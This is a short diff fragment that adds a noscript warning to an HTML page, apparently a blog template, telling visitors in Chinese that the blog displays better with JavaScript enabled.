+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
